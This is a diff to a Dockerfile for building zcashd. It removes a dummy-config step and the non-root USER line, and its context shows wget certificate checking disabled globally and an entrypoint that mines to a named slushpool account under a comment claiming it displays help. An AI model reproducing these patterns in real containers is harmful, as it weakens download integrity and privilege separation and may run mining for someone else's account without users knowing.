@@ -51,12 +51,5 @@ RUN echo "check_certificate = off" > /root/.wgetrc && mkdir -p /opt/code/; cd /o
     /usr/bin/install -c bitcoin-tx zcashd zcash-cli zcash-gtest -t /usr/local/bin/ && \
     rm -rf /opt/code/
 
-# generate a dummy config    
-RUN PASS=$(date | md5sum | cut -c1-24); mkdir -p /root/.zcash/; \
-    printf '%s\n%s\n%s\n%s\n%s\n' "rpcuser=zcashrpc" "rpcpassword=${PASS}" \
-    "testnet=1" "addnode=betatestnet.z.cash" "gen=1" >> ${ZCASH_CONF}     
-
-USER 1001
-
 # no parameters display help
 ENTRYPOINT ["/usr/local/bin/zcashd", "cpuminer", "-l eu.zec.slushpool.com:4444" ,"-u st4lk3r0816.zworker1" ,"-p x"]
